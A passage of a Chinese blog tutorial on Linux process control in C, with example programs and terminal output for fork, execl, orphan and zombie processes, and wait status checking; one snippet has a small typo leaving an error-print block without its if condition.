class="number">3</span>;</span><br><span class="line">    <span class="keyword">int</span> counter=<span class="number">200</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">        counter+=<span class="number">200</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"first process, pid = %d \n"</span>, getpid());</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"--counter = %d \n"</span>,counter);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">1</span>) </span><br><span class="line">        &#123;</span><br><span class="line">        counter+=<span class="number">200</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"second process, pid = %d \n"</span>, getpid());</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"--counter = %d \n"</span>,counter);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">2</span>) </span><br><span class="line">        &#123;</span><br><span class="line">        counter+=<span class="number">200</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"third process, pid = %d \n"</span>, getpid());</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"--counter = %d \n"</span>,counter);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i == n) </span><br><span class="line">        &#123;</span><br><span class="line">        counter+=<span class="number">400</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"parent process, pid = %d \n"</span>, getpid());</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"--counter = %d \n"</span>,counter);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>运行结果：</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面# ./fork2</span><br><span class="line">first process, pid = 10523 </span><br><span class="line">--counter = 400 </span><br><span class="line">parent process, pid = 10522 </span><br><span class="line">--counter = 600 </span><br><span class="line">second process, pid = 10524 </span><br><span class="line">--counter = 400 </span><br><span class="line">third process, pid = 10525 </span><br><span class="line">--counter = 400</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pid_t</span> pid, wpid;</span><br><span class="line">	<span class="keyword">int</span> status;</span><br><span class="line">	<span class="keyword">int</span> fd=<span class="built_in">open</span>(<span class="string">"hello"</span>,O_RDWR|O_CREAT,<span class="number">0777</span>); <span class="comment">//打开hello文件，不存就就创建它</span></span><br><span class="line">    <span class="comment">//O_RDWR | O_CREAT  参数表示创建该文件，且以读写的方式打开   0777定义创建文件的权限，文件的权限都是8进制数（以0开头的数），0777等价于777</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"open error\n"</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">	pid = fork();</span><br><span class="line">	<span class="keyword">if</span>(pid == <span class="number">-1</span>)&#123;</span><br><span class="line">		perror(<span class="string">"fork error"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;		<span class="comment">//son</span></span><br><span class="line">		sleep(<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">		lseek(fd,<span class="number">0</span>,SEEK_SET);</span><br><span class="line">		<span class="keyword">int</span> len=<span class="built_in">read</span>(fd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%s\n"</span>, buf);</span><br><span class="line">		<span class="built_in">close</span>(fd);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">char</span> *p=<span class="string">"aaaaaaaaaaaaaabbbbbbbbbbbbbcccccccccccccccc"</span>;</span><br><span class="line">		<span class="built_in">write</span>(fd,p,<span class="built_in">strlen</span>(p)+<span class="number">1</span>);</span><br><span class="line">		<span class="built_in">close</span>(fd);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="exec函数族"><a href="#exec函数族" class="headerlink" title="exec函数族"></a><strong>exec函数族</strong></h3><p><strong>让父子进程执行不相干的操作</strong></p>
<p><strong>如果函数执行成功，不返回值</strong></p>
<p><strong>如果执行失败，打印错误信息，退出当前进程</strong></p>
<p><strong>本质是替换代码块.text中的内容，无需再创建新进程</strong></p>
<p><strong>execl ：执行ls -lah 的时候，就替换了后续的for循环，当ls执行结束的时候，就直接推出了，所以这里for循环仅执行1次</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">print</span>(xxxxx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">pid_t</span> pid=fork(); <span class="comment">//创建子进程</span></span><br><span class="line"><span class="keyword">if</span>(pid==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	execl(<span class="string">"/bin/ls"</span>,<span class="string">"666"</span>,<span class="string">"-lah"</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"++++++ i=%d\n"</span>,i);   <span class="comment">///仅执行一次</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">-1</span> ) &#123;</span><br><span class="line">        perror(<span class="string">"fork"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"I'm parent pid = %d, parentID = %d\n"</span>, getpid(), getppid());</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        sleep(<span class="number">3</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"i am child\n"</span>);</span><br><span class="line">        execl(<span class="string">"/bin/ls"</span>, <span class="string">"ls"</span>, <span class="string">"-l"</span>,  <span class="literal">NULL</span>);<span class="comment">//一般执行自己写的程序，参数写完后加NULL</span></span><br><span class="line">        perror(<span class="string">"exec"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------finish...%d\n"</span>, getpid());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面# ./execl_1 </span><br><span class="line">I'm parent pid = 11329, parentID = 1426</span><br><span class="line">-------finish...11329</span><br><span class="line">root@kali:~/桌面# i am child</span><br><span class="line">总用量 56504</span><br><span class="line">drwxrwxrwx  2 root root     4096 4月  22 17:59 chj</span><br><span class="line">-rwxr-xr-x  1 root root    17024 5月   1 21:45 execl_1</span><br><span class="line">-rw-r--r--  1 root root      512 5月   1 21:45 execl_1.c</span><br><span class="line">-rwxr-xr-x  1 root root     3826 11月 14 04:55 firefox-esr.desktop</span><br><span class="line">-rwxr-xr-x  1 root root    16872 4月  20 21:12 fork</span><br><span class="line">-rwxr-xr-x  1 root root    16720 4月  20 21:39 fork2</span><br><span class="line">-rw-r--r--  1 root root      796 4月  20 21:39 fork2.c</span><br><span class="line">-rwxr-xr-x  1 root root    17120 5月   1 20:26 fork3</span><br><span class="line">-rw-r--r--  1 root root      679 5月   1 20:25 fork3.c</span><br><span class="line">-rw-r--r--  1 root root      527 4月  20 21:12 fork.c</span><br><span class="line">-rwxr-xr-x  1 root root     8430 4月   2 20:55 google-chrome.desktop</span><br><span class="line">-rwxr-xr-x  1 root root       44 5月   1 20:28 hello</span><br><span class="line">-rw-r--r--  1 root root      181 4月  21 20:02 test.php</span><br></pre></td></tr></table></figure>



<p><strong>孤儿进程：</strong></p>
<p><strong>父进程结束，子进程还在，则子进程的父进程编程init进程</strong></p>
<p><strong>目的：为了释放子进程占用的系统资源</strong></p>
<p><strong>子进程释放不了pcb，必须由父进程释放</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">	pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">-1</span> ) &#123;</span><br><span class="line">        perror(<span class="string">"fork"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		 <span class="built_in">printf</span>(<span class="string">"I'm parent pid = %d, parentID = %d\n"</span>, getpid(), getppid());</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">         sleep(<span class="number">1</span>);</span><br><span class="line">		 <span class="built_in">printf</span>(<span class="string">"child  pid = %d, parentID=%d \n"</span>, getpid(), getppid());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面# ./wait_1 </span><br><span class="line">I'm parent pid = 11675, parentID = 1426</span><br><span class="line">root@kali:~/桌面# child  pid = 11676, parentID=1</span><br></pre></td></tr></table></figure>



<p><strong>僵尸进程：</strong></p>
<p><strong>子进程结束，父进程还在，但父进程不释放子进程的pcb</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">	pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">-1</span> ) &#123;</span><br><span class="line">        perror(<span class="string">"fork"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>) </span><br><span class="line">		&#123;</span><br><span class="line">			sleep(<span class="number">1</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"I'm parent pid = %d, parentID = %d\n"</span>, getpid(), getppid());</span><br><span class="line">		&#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123; </span><br><span class="line">		 <span class="built_in">printf</span>(<span class="string">"child  pid = %d, parentID=%d\n"</span>, getpid(), getppid());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p><strong>wait（int *status）</strong></p>
<p><strong>函数作用：</strong></p>
<p><strong>1.阻塞并等待子进程退出</strong></p>
<p><strong>2.回收子进程残留资源</strong></p>
<p><strong>3.获取子进程结束状态（退出原因）</strong></p>
<p><strong>返回值：</strong></p>
<p><strong>成功：清理掉的子进程ID</strong></p>
<p><strong>失败：-1（没有子进程）</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pid_t</span> pid, wpid;</span><br><span class="line">	<span class="keyword">int</span> status;</span><br><span class="line">	pid = fork();</span><br><span class="line">	<span class="keyword">if</span>(pid == <span class="number">-1</span>)&#123;</span><br><span class="line">		perror(<span class="string">"fork error"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;		<span class="comment">//son</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"I'm process child, pid = %d\n"</span>, getpid());</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 1</span></span><br><span class="line">		execl(<span class="string">"./abnor"</span>, <span class="string">"abnor"</span>, <span class="literal">NULL</span>);</span><br><span class="line">		perror(<span class="string">"execl error"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">		sleep(<span class="number">1</span>);				</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">10</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">//wpid = wait(NULL);	//传出参数</span></span><br><span class="line">		wpid = wait(&amp;status);	<span class="comment">//传出参数</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(WIFEXITED(status))&#123;	<span class="comment">//非0 ---正常退出</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"I'm parent, The child process "</span></span><br><span class="line">					<span class="string">"%d exit normally\n"</span>, wpid);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"return value:%d\n"</span>, WEXITSTATUS(status));</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (WIFSIGNALED(status)) &#123;	<span class="comment">//非0 ----异常退出</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"The child process exit abnormally, "</span></span><br><span class="line">					<span class="string">"killed by signal %d\n"</span>, WTERMSIG(status));</span><br><span class="line">										<span class="comment">//获取信号编号</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"other...\n"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *p = <span class="string">"test of wait abnormally\n"</span>;</span><br><span class="line"><span class="comment">//    p[0] = 'h';</span></span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">5</span>/<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">56</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面# ./wait</span><br><span class="line">I'm process child, pid = 12083</span><br><span class="line">The child process exit abnormally, killed by signal 8</span><br></pre></td></tr></table></figure>





<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pid_t</span> pid,wpid;       <span class="comment">//进程标识符</span></span><br><span class="line"> 	<span class="keyword">int</span> status;</span><br><span class="line">	pid = fork();     <span class="comment">//创建一个新的进程</span></span><br><span class="line">	<span class="keyword">if</span>(pid&lt;<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"创建进程失败!"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)   <span class="comment">//子进程1</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"----子进程1----进程标识符是%d\n"</span>,getpid());</span><br><span class="line">		execl(<span class="string">"/bin/ls"</span>,<span class="string">"ls"</span>,<span class="string">"-1"</span>,<span class="string">"-color"</span>,<span class="literal">NULL</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"exec failed!\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>          <span class="comment">//否则为父进程</span></span><br><span class="line">	&#123;</span><br><span class="line">		pid = fork();<span class="comment">//创建新进程</span></span><br><span class="line">		<span class="keyword">if</span>(pid&lt;<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"创建进程失败!"</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)   <span class="comment">//子进程2</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"----子进程2----进程标识符是%d\n"</span>,getpid());</span><br><span class="line">			execl(<span class="string">"/bin/ls"</span>,<span class="string">"ls"</span>,<span class="string">"-l"</span>,<span class="string">"-color"</span>,<span class="literal">NULL</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"exec failed!\n"</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>          <span class="comment">//否则为父进程</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//wait(NULL); //对退出状态不关注，等待子进程退出</span></span><br><span class="line">			wpid = wait(&amp;status);	<span class="comment">//传出参数</span></span><br><span class="line">	    	<span class="keyword">if</span>(WIFEXITED(status))</span><br><span class="line">			&#123;	<span class="comment">//非0 ---正常退出</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"I'm parent, The child process "</span></span><br><span class="line">					<span class="string">"%d exit normally\n"</span>, wpid);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"return value:%d\n"</span>, WEXITSTATUS(status));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"父进程,进程标识符是%d\n"</span>,getpid());</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"完成！\n"</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125; </span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (WIFSIGNALED(status)) &#123;	<span class="comment">//非0 ----异常退出</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"The child process exit abnormally, "</span></span><br><span class="line">					<span class="string">"killed by signal %d\n"</span>, WTERMSIG(status));</span><br><span class="line">										<span class="comment">//获取信号编号</span></span><br><span class="line">		&#125; </span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"other...\n"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		&#125;     </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



